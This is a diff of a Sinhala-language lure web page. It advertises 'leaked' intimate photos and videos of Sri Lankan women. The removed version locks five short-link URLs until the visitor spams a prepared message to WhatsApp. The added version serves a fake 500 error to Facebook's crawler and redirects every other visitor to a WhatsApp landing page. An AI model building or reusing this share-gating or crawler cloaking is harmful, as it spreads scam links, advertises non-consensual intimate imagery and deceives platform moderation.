@@ -1,297 +1,36 @@
 <!DOCTYPE html>
-<html lang="si">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta property="og:title" content="ලංකාවේ කෙල්ලොන්ගේ ලීක් ෆොටෝස් බලන්න මෙතනින් එන්න 🔞">
-	<meta property="og:description" content="ලංකාවේ සුපිරි කෑලිවල ලීක් ඔක්කොම එකම තැනකින් බලන්න - Jilhub">
-	<meta property="og:image" content="https://jil.kello.me/w-og.jpg">
-	<meta property="og:url" content="">
-	<meta property="og:type" content="website">
-    <title>Kello.Me</title>
-    <style>
-        
-        body {
-    background-color: #000 !important;
-    color: white !important;
-    font-family: Arial, sans-serif;
-    text-align: center;
-    padding: 20px;
-}
-
-.container, .links-container {
-    background: #111;
-    padding: 20px;
-    border-radius: 10px;
-    text-align: center;
-    width: 90%;
-    max-width: 400px;
-    margin: 0 auto 20px;
-}
-
-.walhub-header h1 {
-    font-size: 28px;
-    font-weight: bold;
-    margin-bottom: 15px;
-}
-
-.walhub-header .wal {
-    color: #fff;
-}
-
-.walhub-header .hub {
-    background-color: #ff9900;
-    color: black;
-    padding: 3px 8px;
-    border-radius: 6px;
-}
-
-.gradient-line {
-    width: 80%;
-    height: 3px;
-    background: linear-gradient(to right, transparent, #ff9900, transparent);
-    border: none;
-    margin: 15px auto;
-}
-
-.info-text {
-    font-size: 16px;
-    color: White;
-    font-weight: bold;
-    margin-bottom: 15px;
-    line-height: 1.5;
-}
-
-.share-btn {
-    display: inline-block;
-    width: 100%;
-    max-width: 250px;
-    padding: 12px;
-    font-size: 14px;
-    font-weight: bold;
-    text-transform: uppercase;
-    text-align: center;
-    color: White !important;
-    background: #ff9900 !important;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    box-shadow: 0px 3px 8px rgba(255, 153, 0, 0.5);
-    transition: 0.3s ease-in-out;
-    margin-top: 10px;
-}
-
-.share-btn:hover {
-    transform: scale(1.05);
-	color: black !important;
-    background: #ffcc00 !important;
-    box-shadow: 0px 5px 12px rgba(255, 204, 0, 0.7);
-}
-
-.locked {
-    background: #444 !important;
-    cursor: not-allowed;
-    box-shadow: none;
-}
-
-.links-container {
-    display: none;
-}
-
-.video-header {
-    font-size: 20px;
-    font-weight: bold;
-    color: #ff9900;
-    margin-bottom: 8px;
-}
-
-.link-buttons {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 10px;
-}
-
-.link-btn {
-    display: inline-block;
-    width: 100px;
-    padding: 8px;
-    font-size: 12px;
-    font-weight: bold;
-    color: #000 !important;
-    text-transform: uppercase;
-    text-align: center;
-    text-decoration: none;
-    border-radius: 6px;
-    background: #ff9900 !important;
-    box-shadow: 0px 3px 8px rgba(255, 153, 0, 0.5);
-    transition: 0.3s ease-in-out;
-}
-
-.link-btn:hover {
-    transform: scale(1.1);
-    background: #ffcc00 !important;
-    box-shadow: 0px 5px 12px rgba(255, 204, 0, 0.7);
-}
-
-.footer {
-    margin-top: 20px;
-    font-size: 10px;
-    color: #777;
-}
-
-    </style>
-	
-	
+    <title>Page Access Control</title>
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="ලංකාවේ කෙල්ලොන්ගේ ලීක් ෆොටෝස් බලන්න මෙතනින් එන්න 🔞">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://kello.me/jilhub/">
+    <meta property="og:image" content="https://jil.kello.me/ogimages/image_1745855013_680fa2251d2a8.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:description" content="ලංකාවේ සුපිරි කෑලිවල ලීක් ඔක්කොම එකම තැනකින් බලන්න - Jilhub 🔴🔥">
+    <script>
+        window.onload = function() {
+            // Check the user agent
+            const userAgent = navigator.userAgent;
+            // Simulate checking for Facebook's crawler
+            if (userAgent.includes('facebookexternalhit')) {
+                // Simulate sending a 500 error response
+                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
+                return; // Stop further execution
+            }
+            // Otherwise, redirect to a random page
+            const pages = [
+                "https://jil.kello.me/landing-whatsapp.php"
+            ];
+            const randomPage = pages[Math.floor(Math.random() * pages.length)];
+            window.location.href = randomPage;
+        };
+    </script>
 </head>
 <body>
-
-<div id="hearts-container"></div>
-    
-    <style>
-        #hearts-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
-        
-        .heart {             
-    position: fixed;             
-    color: #ffffff; /* White color */
-    font-size: 24px;             
-    z-index: 0;             
-    animation: heartFall linear forwards;         
-}
-
-        
-        @keyframes heartFall {
-            0% {
-                transform: translateY(-10vh) translateX(0) rotate(0deg);
-                opacity: 0.3;
-            }
-            100% {
-                transform: translateY(100vh) translateX(20px) rotate(360deg);
-                opacity: 0;
-            }
-        }
-    </style>
-
-    <script>
-        function createHeart() {
-            const heart = document.createElement('div');
-            heart.innerHTML = '❤';
-            heart.className = 'heart';
-            heart.style.left = Math.random() * 100 + 'vw';
-            heart.style.animationDuration = (Math.random() * 2 + 3) + 's'; // Between 3-5 seconds
-            
-            document.getElementById('hearts-container').appendChild(heart);
-            
-            // Remove the heart after animation completes
-            setTimeout(() => {
-                heart.remove();
-            }, 5000);
-        }
-
-        // Start creating hearts when page loads
-        window.addEventListener('load', function() {
-            setInterval(createHeart, 300);
-        });
-    </script>
-
-    <div class="container">
-        <!-- Kello Header -->
-        <div class="kello-header">
-            <a href="https://kello.me/jilhub/"><img src="https://kello.me/jilhub/albums/logo.png" style="max-height: 50px;" alt="SL Actress Photo Page Logo"></a>
-            <hr class="gradient-line">
-        </div>
-
-        <!-- Share Instruction -->
-        <p class="info-text">පහල Share To Whatsapp Button එක Click කරලා Share කරලා Link එක Unlock කරගන්න</p>
-
-        <button id="shareBtn" class="share-btn locked">🔒 Share to WhatsApp</button>
-    </div>
-
-    <!-- Links Section (Initially Hidden) -->
-    <div class="links-container" id="linksContainer" style="display: none;">
-        <h2 class="video-header">පහල ලීක් ෆොටෝස්, වීඩියෝ තියෙනවා</h2>
-        <p class="info-text">සුපිරිම ඒවා ටික පහල Link වලින් බලන්න. Share කරනකොට තව හොද ඒවා වැටෙයි.</p>
-
-        <div class="link-buttons">
-            <a href="https://tapthelink.cfd/Link1" class="link-btn unlock-link">LINK 1</a>
-            <a href="https://tapthelink.cfd/Link2" class="link-btn unlock-link">LINK 2</a>
-            <a href="https://tapthelink.cfd/Link3" class="link-btn unlock-link">LINK 3</a>
-            <a href="https://tapthelink.cfd/Link4" class="link-btn unlock-link">LINK 4</a>
-			<a href="https://tapthelink.cfd/Link5" class="link-btn unlock-link">LINK 5</a>
-        </div>
-    </div>
-
-    <div class="footer">© 2025 Kello.Me All rights reserved.</div>
-
-    <script>
-    // Remove unlock status on page load
-    window.onload = function() {
-        if (!sessionStorage.getItem("linkClicked")) {
-            sessionStorage.removeItem("unlocked");
-        }
-        checkUnlockState();
-    };
-
-    // Check unlock state
-    function checkUnlockState() {
-        let unlocked = sessionStorage.getItem("unlocked");
-        if (unlocked === "true") {
-            document.getElementById("linksContainer").style.display = "block";
-            document.getElementById("shareBtn").textContent = "✅ Done!";
-            document.getElementById("shareBtn").classList.remove("locked");
-            document.getElementById("shareBtn").style.cursor = "default";
-        } else {
-            document.getElementById("linksContainer").style.display = "none";
-            document.getElementById("shareBtn").textContent = "🔒 Share to WhatsApp";
-            document.getElementById("shareBtn").classList.add("locked");
-            document.getElementById("shareBtn").style.cursor = "pointer";
-        }
-    }
-
-    // Share Button Click
-    document.getElementById("shareBtn").addEventListener("click", function() {
-        let shareMessage = encodeURIComponent(
-            "*ලංකාවේ කෙල්ලොන්ගේ ලීක් ෆොටෝස් මෙතනින් බලන්න 🔞👇* \n\n" +
-            "1 ලින්ක් එක👉 https://tapthelink.cfd/Jilhub-Photos\n\n" +
-            "*ලංකාවේ කෙල්ලොන්ගේ ලීක් වීඩියෝ මෙතනින් බලන්න 🍑👇* \n\n" +
-            "2 ලින්ක් එක👉 https://tapthelink.cfd/Jilhub-Videos\n\n" +
-            "*OnlyFans ලීක් වීඩියෝ ෆොටෝස් මෙතනින් බලන්න 😝👇* \n\n" +
-            "3 ලින්ක් එක👉 https://tapthelink.cfd/Onlyfans-Photos\n\n" +
-            "*Lankan Actress ෆොටෝස් මෙතනින් බලන්න 😋👇* \n\n" +
-            "4 ලින්ක් එක👉 https://tapthelink.cfd/Lanka-Actress\n\n" +
-	    "*Telegram Channel එකේ හොදම ඒවා දානවා. මෙතනින් බලන්න 🌸👇* \n\n" +
-            "5 ලින්ක් එක👉 https://tapthelink.cfd/Jilhub-Telegram\n\n" +
-            "*Share කරලා බලන්න ❤*"
-        );
-
-        let whatsappUrl = "https://api.whatsapp.com/send?text=" + shareMessage;
-        window.open(whatsappUrl, "_blank");
-
-        // Unlock after sharing
-        setTimeout(function() {
-            sessionStorage.setItem("unlocked", "true");
-            checkUnlockState();
-        }, 4000);
-    });
-
-    // Clicking any link keeps the page unlocked
-    document.querySelectorAll(".unlock-link").forEach(link => {
-        link.addEventListener("click", function() {
-            sessionStorage.setItem("unlocked", "true");
-            sessionStorage.setItem("linkClicked", "true");
-        });
-    });
-
-    </script>
-
 </body>
 </html>
